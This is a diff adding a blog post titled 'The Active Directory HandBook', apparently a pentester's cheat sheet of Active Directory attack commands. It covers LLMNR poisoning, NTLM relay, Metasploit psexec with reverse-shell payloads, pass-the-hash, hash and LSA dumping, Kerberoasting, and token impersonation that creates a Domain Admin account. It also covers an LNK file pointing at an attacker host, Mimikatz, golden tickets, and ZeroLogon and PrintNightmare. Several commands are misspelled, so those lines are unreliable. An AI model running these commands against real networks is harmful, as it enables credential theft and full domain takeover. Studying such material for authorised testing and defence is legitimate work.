@@ -1,0 +1,421 @@
+---
+layout: post
+title: "The Active Directory HandBook"
+date: 2025-07-27 15:34:00 +0800
+categories: [HandBook, AD]
+tags: [LLMNR, SMB Relay, IPv6, Passback Attack, BloodHound, Ldapdomaindump, PlumHound, Pass Attacks, Kerberoasting, Token Impersonation, LNK File Attack, GPP, Mimikatz, NTDS.dit, Golden Ticket, ZeroLogon, PrintNightmare]
+author: klein
+image:
+    path: /images/images-ad-handbook/cover.png
+---
+
+## Initial Attack Vectors
+
+### LLMNR Poisoning
+
+```bash
+
+# network traffic is needed
+
+sudo responder -I tun0 -dwPv
+
+# Crack NTLMv2 hashes ( --show / --froce (VM) / -O (M) / -r (OneRule) )
+
+hashcat -m 5600 hash.txt rockyou.txt
+
+```
+
+### SMB Relay 
+
+```bash
+
+# SMB signing must be disabled or not enforced (gather addresses to a file, network traffic is still needed) 
+
+nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24
+
+# Turn off HTTP and SMB in the /etc/responder/Responder.conf file
+
+sudo responder -I tun0 -dwPv
+
+# Set up the relay ( -i (for shell) / -c "whoami (command execution))
+
+sudo ntlmrelayx.py -tf targets.txt -smb2support 
+
+```
+
+### Shell Access
+
+```bash
+
+# Using Metasploit Framework
+
+search psexec
+
+use exploit/windows/smb/psexec
+
+# First with a domain user ->
+# Not a high chance of 32 bit machine in the network, change it to 64 bit and fill out the requirements
+
+set payload windows/x64/meterpreter/reverse_tcp
+
+set rhosts targetip
+
+set smbdomain bigcorp.local
+
+set smbuser johndoe
+
+set smbpass MyPassword123
+
+run
+
+# Demonstrate it with a local user ->
+
+set smbuser administrator
+
+unset smbdomain
+
+set smbpass NTLM_hash
+
+run
+
+# Using psexec (manual way) with password ->
+
+psexec.py corp.local/johndoe:'MyPassword123'@10.0.0.1
+
+# Using a hash
+
+psexec.py administrator@10.0.0.2 -hashes NTLM_hash
+
+# Alternatives -> wmiexec.py | smbexec.py
+
+```
+
+### DNS Takeover via IPv6
+
+```bash
+
+# Set up the relay (network traffic is needed)
+
+ntlmrelayx.py -6 -t ldaps://<ip_of_domain_controller> -wh text.corp.local -l treasure
+
+sudo mitm6 -d corp.local
+
+# Look out for the newly created user (maybe next step would be DCSync with secretsdump)
+
+```
+
+### Passback Attack
+
+```bash
+
+# Should there be any printer or IoT device (LDAP/SMB connections) | Responder can also catch the request
+
+nc -nvlp <port_that_the_service_connects_to>
+
+# Also, change the IP to the attacker machine. 
+
+```
+
+## Post-Compromise Enumeration
+
+**A compromised account is needed to get to this stage.**
+
+### Ldapdomaindump
+
+```bash
+
+# Create a directory for the output
+
+mkdir corp.local
+
+sudo ldapdomaindump ldaps://<ip_of_domain_controller> -u 'CORP.local\johndoe' -p MyPassword123 -o corp.local
+
+```
+
+### Bloodhound
+
+```bash
+
+# Update to the latest version
+
+sudo pip install bloodhound
+
+sudo neo4j console
+
+# Run Bloodhound
+
+sudo bloodhound
+
+# Create a directory for the output
+
+mkdir bloodhound
+
+cd bloodhound
+
+sudo bloodhound-python -d CORP.local -u johndoe -p MyPassword123 -ns -c all
+
+# Load the data into the application
+```
+
+### Plumhound
+
+```bash
+
+cd /opt
+
+sudo git clone https://github.com/PlumHound/PlumHound.git
+
+# Once you have it
+
+cd PlumHound
+
+sudo pip3 install -r requirements.txt
+
+# Let's start using it (Bloodhound needs to be up and running)
+
+sudo python3 PlumHound.py --easy -p <neo4j_password>
+
+sudo python3 PlumHound.py -x tasks/default.task -p <neo4j_password>
+
+```
+
+## Post-Compromise Attacks
+
+**A compromised account is needed to get to this stage**
+
+### Pass Attacks
+
+```bash
+
+# Pass the Password attack (highly, highly advised to use netexec rather)
+
+crackmapexec smb 10.10.0.0/24 -u johndoe -d CORP.local -p MyPassword123
+
+# Where accepted, grab the hashes (on metasploit shell, just "hashdump")
+
+secretsdump.py CORP.local/johndoe:Mypassword123@<where_accepted_ip>
+
+# Pass the Hash
+
+crackmapexec smb 10.10.0.0/24 -u johndoe -H <hash_value> --local-auth
+
+# Pass the Hash (dump the SAM)
+
+crackmapexec smb 10.10.0.0/24 -u johndoe -H <hash_value> --local-auth --sam
+
+# Pass the Hash (list available shares)
+
+crackmapexec smb 10.10.0.0/24 -u johndoe -H <hash_value> --local-auth --shares
+
+# Pass the Hash (dump LSA)
+
+crackmapexec smb 10.10.0.0/24 -u johndoe -H <hash_value> --local-auth --lsa
+
+# Pass the Hash (dump lsassy)
+
+crackmapexec smb -L
+
+crackmapexec smb 10.10.0.0/24 -u johndoe -H <hash_value> --local-auth -M lsassy
+
+```
+
+### Dumping Hashes
+
+```bash
+
+secrtesdmup.py CORP.local/johndoe:'MyPassword123'@<target_ip>
+
+# Let's crack the hashes
+
+hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
+
+# In case wdigest pops up, there will be a cleartext password
+
+secretsdump.py johndoe:@<target_ip> -hashes <corresponding_hash_here>
+
+# In case not sure in which module to use
+
+hashcat --help | grep NTLM
+
+```
+
+### Kerberoasting
+
+```bash
+
+sudo GetUserSPNs.py CORP.local/johndoe:Mypassword123 -dc-ip <ip_of_domain_controller> -request
+
+#Let's crack the hash
+
+hashat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
+
+
+```
+
+### Token Impersonation
+
+```bash
+
+msfconsole
+
+search psexec
+
+use exploit/windows/smb/psexec
+
+set payload windows/x64/meterpreter/reverse_tcp
+
+set rhosts <target_machine_ip>
+
+set smbuser johndoe
+
+set smbpass MyPassword123
+
+set smbdomain CORP.local
+
+run
+
+# Now, look around for any high value tokens (a delegate token is needed for this to work)
+
+load incognito
+
+# Or use -g for groups
+
+list_tokens -u
+
+impersonate_token corp\\alice
+
+# In case of a higher privileged user
+
+net user /add bob MyPassword123# /domain
+
+add bob MyPassword123# /domain
+
+net group "Domain Admins" bob /ADD /DOMAIN
+```
+
+### LNK File Attacks
+
+```bash
+
+# Create the file in an elevated shell
+
+$objShell = New-Object -ComObject WScript.shell
+$lnk = $objShell.CreateShortcut("C:\test.lnk")
+$lnk.TargetPath = "\\<attacker_ip>\@test.png"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Test"
+$lnk.HotKey = "Ctrl+Alt+T"
+$lnk.Save()
+
+# More automated version of this attack
+
+netexec smb <target_ip> -d corp.local -u johndoe -p MyPassword123 -M slinky -o NAME=test SERVER=<attacker_ip>
+
+# Add a '@' or '~' sign at the beginning of the file in order to list it at the top of the screen
+
+sudo responder -I eth0 -dP
+
+# Make sure the .conf file has the switches ON
+```
+
+### GPP / cPassword Attacks
+
+```bash
+
+msfconsole
+
+search gpp
+
+# Provide the usual user credentials
+
+use auxiliary/smb_enum_gpp
+
+```
+
+### Mimikatz (obfuscation is necessary)
+
+```bash
+
+# https://github.com/gentilkiwi/mimikatz
+
+# x64 -> .sys/.dll/.dll/.exe -> get these to the target machine
+
+mimikatz.exe
+
+privlege::debug
+
+sekurlsa::logonPasswords
+
+```
+
+## Post-Domain Compromise
+
+
+### Dumping the NTDS.dit
+
+```bash
+secretsdump.py CORP.local/bob:'MyPassword123#'@<domain_controller_ip> -just-dc-ntlm
+```
+
+### Golden Ticket Attack
+
+```bash
+
+# Mimikatz way of doing it 
+
+mimikatz.exe
+
+privilege::debug
+
+lsadump:lsa /inject /name:krbtgt
+
+# The SID and the NTLM hash is needed
+
+kerberos::golden /User:Administrator /domain:corp.local /sid:<sid_from_dump> /krbtgt:<hash_from_dump> /id:500 /ptt
+
+# Let's use the session of the golden ticket 
+
+misc::cmd
+
+# Example command
+
+dir \\johndoe\c$
+
+# Example command (you can also create a new user, try a silver ticket, your choice)
+
+psexec.exe \\johndoe cmd.exe
+
+
+```
+
+## Patching Vulnerabilities
+
+### ZeroLogon
+
+```bash
+
+# For exploit: https://github.com/dirkjanm/CVE-2020-1472
+
+# For testing: https://github.com/SecuraBV/CVE-2020-1472
+
+pip install -r requirements.txt
+
+./zerologon_tester.py CORP-DC <domain_controller_ip>
+
+```
+
+### PrintNightmare
+
+```bash
+
+# https://github.com/cube0x0/CVE-2021-1675
+
+rpcdump.py @<domain_controller_ip> | egrep 'MS-RPRN|MS-PAR'
+
+# If we see the following, it is vulnerable:
+
+# Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
+# Protocol: [MS-RPRN]: Print System Remote Protocol
+
+```
